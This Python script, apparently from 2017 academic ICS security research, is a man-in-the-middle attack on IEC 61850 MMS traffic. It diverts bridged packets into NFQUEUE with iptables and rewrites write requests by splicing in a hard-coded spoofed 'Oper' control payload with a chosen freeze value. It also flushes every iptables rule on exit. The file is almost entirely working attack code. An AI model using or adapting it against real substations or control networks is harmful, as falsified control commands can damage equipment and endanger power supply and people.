#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2017 Francisco Furtado, francisco_dos@sutd.edu.sg
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER

# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

from netfilterqueue import NetfilterQueue
import os, sys, argparse, struct, binascii
import datetime, ctypes, random
from time import sleep
from time import time as ts
# scapy used from 'pip install scapy-python3'
from scapy import all as scapy_all
from scapy.layers.inet import IP
from scapy.layers.inet import UDP
from scapy.all import *
# import cip,enip_tcp

HACKMODE = "READ" #ALLFALSE, ALLTRUE, FREEZE, READ
FREEZEVAL = 0
invokes = {} # invokeNumber - {details}

def bytes_to_int(bytes):
    result = 0

    for b in bytes:
        result = result * 256 + int(b)

    return result

def int_to_bytes(value, length):
    result = []

    for i in range(0, length):
        result.append(value >> (i * 8) & 0xff)

    result.reverse()

    return result


# dictionary to freeze





def __extract(packet):
    print('extracting')

    pkt = IP(packet.get_payload())
    del pkt[IP].chksum

    if 'stVal' in str(pkt.build()) or 'ctlVal' in str(pkt.build()) or 'Oper' in str(pkt.build()):
        #byte 65 onwars starts from 51 - 14 difference
        load = pkt.build()[51:]
        invokeNumber = bytes_to_int(pkt.build()[64:67])
        pdu_mode = (pkt.build()[60]) # 160 request - 161 response
        io_mode = (pkt.build()[67]) # 164 read - 165 write
        print('invokeNumber:',invokeNumber)
        print('pdu_mode:',pdu_mode)
        print('io_mode:', io_mode)

        # invokes[invokeNumber] = [pdu_mode, io_mode, domainID, itemID]

        if 'stVal' in str(pkt.build()):
            print('stval here')
            if pdu_mode == 'a0':
                domainID = str(pkt.build()[81:100])
                itemID = str(pkt.build()[92:118])

            # print(load)
            
            print('domainID:',domainID)
            print('itemID:',itemID)

        if 'Oper' in str(pkt.build()):

            

            if pdu_mode == 160: #write
                mmscut = pkt.build()[:62]

                spoofoper = "a0 59 a0 57 02 03 01 fb\
54 a5 50 a0 2c 30 2a a0 28 a1 26 1a 09 4d 49 45\
44 31 43 54 52 4c 1a 19 53 50 44 4f 6e 73 47 47\
49 4f 34 24 43 4f 24 53 50 43 53 4f 24 4f 70 65\
72 a0 20 a2 1e 83 01 00 a2 05 85 01 01 89 00 86\
01 00 91 08 00 00 00 00 00 00 00 00 83 01 00 84\
02 06 00"
                spoofoper = "".join(spoofoper.split())
                print(spoofoper)
                spoofarray = bytearray.fromhex(spoofoper)
                print(spoofarray)


                mmsnew = mmscut + spoofarray

                if io_mode == 165:
                    domainID = pkt.build()[79:98]
                    itemID = pkt.build()[90:116]
                    print('domainID:',domainID)
                    print('itemID:',itemID)
                elif io_mode == 164:
                    domainID = pkt.build()[81:100]
                    itemID = pkt.build()[92:118]
                    print('domainID:',domainID)
                    print('itemID:',itemID)

                mmsnew = mmsnew[:79] + domainID + mmsnew[98:]
                mmsnew = mmsnew[:90] + itemID + mmsnew[118:]
                mmsnew = mmsnew[:121] + bytearray([FREEZEVAL]) + mmsnew[122:]
                mmsnew = mmsnew[:144] + bytearray([FREEZEVAL]) + mmsnew[145:]

                # loadstruct = str(pkt.build()[119:163])
                # print(loadstruct)

            # mmsip = IP(mmsnew)
            # del mmsip[IP]
            mmsip = IP(mmsnew)
            mmsip[IP].len = len(mmsnew)


            packet.set_payload(mmsip.build())
            # del pkt[IP].chksum
            print(len(pkt.build()))
            print(len(mmsnew))

    # then, let the netfilterqueue forward the packet   
    packet.accept()


        
def start(source_interface):
    __setdown()
    __setup(source_interface)
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, __extract)
   
    try:
        print("[*] starting NFQUEUE")
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        print("[*] stopping NFQUEUE")
        nfqueue.unbind()  
    return 1

def __setup(source_interface):
    print('setting up with physdev-in '+source_interface)
    # os.system('iptables -A FORWARD -p tcp -m physdev --physdev-in ' + 
    #            source_interface + ' -j NFQUEUE --queue-num 1')
    os.system('iptables -A FORWARD -m physdev --physdev-in ' + 
               source_interface + ' -j NFQUEUE --queue-num 1')
    toggle_flag = False


def __setdown():
    sleep(1) # wait for one second before stopping the attack
    os.system('sudo iptables -F')


if __name__ == '__main__':
    argg = sys.argv[1]
    fval = int(sys.argv[2])
    start(argg)
    